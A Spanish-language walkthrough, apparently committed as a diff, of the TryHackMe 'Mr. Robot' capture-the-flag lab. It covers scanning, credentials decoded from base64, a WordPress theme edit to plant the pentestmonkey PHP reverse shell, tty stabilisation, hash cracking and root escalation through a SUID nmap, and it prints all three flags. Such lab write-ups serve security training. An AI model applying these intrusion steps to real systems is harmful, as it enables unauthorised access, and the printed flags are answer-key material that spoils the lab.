@@ -1,0 +1,136 @@
+TryHackMe
+Mr. Robot
+
+nmap:
+
+    nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn -oN nmap 10.10.47.5
+
+    • 80/tcp open tcpwrapped syn-ack ttl 64
+
+    • 443/tcp open tcpwrapped syn-ack ttl 64
+    | Public Key type: rsa
+    | -----BEGIN CERTIFICATE-----
+    | MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
+    | d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
+    | MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
+    | MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
+    | sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
+    | yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
+    | KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
+    | 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
+    | ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
+    | -----END CERTIFICATE-----
+
+Al parecer, obtuvimos una clave RSA a pesar de no tener ningún puerto RSA abierto. Al eliminar "--open", confirmamos que hay un puerto SSH cerrado.
+
+    • 22/tcp closed ssh reset ttl 255
+
+whatweb:
+    • [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.52.74], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]
+
+wp-scan:
+    • WordPress version 4.3.1 identificada (Insegura, lanzada el 2015-09-15).
+
+gobuster:
+
+    gobuster dir -u http://10.10.138.94 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+    
+    • /images
+    • /blog
+    • /feed
+    • /license
+    • /wp.login.php
+    • /0
+    • /robot.txt
+    • /feed
+    • /video
+    • /image
+    • /feed/atom
+    • /admin
+    • /audio
+    • /css
+    • /feed
+    • /wp-includes
+    • /js
+    • /feed/rdf
+    • /wp-admin
+
+Dentro de robot.txt, encontramos una ruta a "/key-1-of-3.txt" y dentro encontramos la primera flag:
+
+key-1-of-3.txt
+• 073403c8a58a1f80d943455fb30724b9
+
+También encontramos "/fsocity.dic", parece ser un diccionario útil para resolver la máquina. Lo guardaremos.
+
+Dentro de "/license" vemos un texto y al final un hash "ZWxsaW90OkVSMjgtMDY1Mgo=".
+
+Al decodificarlo de Base64:
+
+> echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
+    • elliot:ER28-0652
+
+Email:
+    • elliot@mrrobot.com
+
+Ahora estamos dentro de WordPress ya que obtuvimos el usuario y contraseña anteriormente. Accedemos a "edit" y en el apartado 404 pegamos pentestmonkey, que es una reverseshell en PHP.
+
+Abrimos la escucha en el puerto 443 y ya tenemos una reverse shell.
+
+Ahora procedemos al tratamiento de la tty.
+
+> script /dev/null -c bash
+> ^z
+
+> stty raw -echo; fg
+    > reset xterm
+    ERROR
+
+Este error se soluciona con un script en Python:
+
+> script /dev/null -c bash
+> python -c "import pty;pty.spawn('/bin/bash')"
+> ^z
+
+> stty raw -echo; fg
+    > reset 
+    > xterm
+    > ^c
+
+> export TERM=xterm
+> export SHELL=bash
+
+Ahora entre las carpetas encontramos el usuario "robot". Dentro de /home/robot, encontramos "key-2-of-3.txt":
+
+cat key-2-of-3.txt
+• robot:c3fcd3d76192e4007dfb496cca67e13b
+
+Vemos que es un hash de la contraseña de "robot". La desencriptamos y obtenemos:
+
+> abcdefghijklmnopqrstuvwxyz
+
+> su robot
+    pass: abcdefghijklmnopqrstuvwxyz
+
+> whoami: robot
+
+> cat key-2-of-3.txt
+    • 822c73956184f694993bede3eb39f959
+
+Ahora necesitamos ser root. Ejecutamos el siguiente comando para ver qué se ejecuta con root:
+
+> find / -perm -4000 2>/dev/null
+
+Nos topamos con "nmap" que se ejecuta como root:
+
+> /usr/local/bin/nmap
+
+Descubrimos que nmap puede ejecutar una bash propia con el comando "--interactibe". Creamos una bash con el siguiente comando:
+
+> !bash -p
+
+Ahora tenemos una bash como root :D
+
+> whoami: root
+
+> cat key-3-of-3.txt 
+    • 04787ddef27c3dee1ee161b21670b4e4
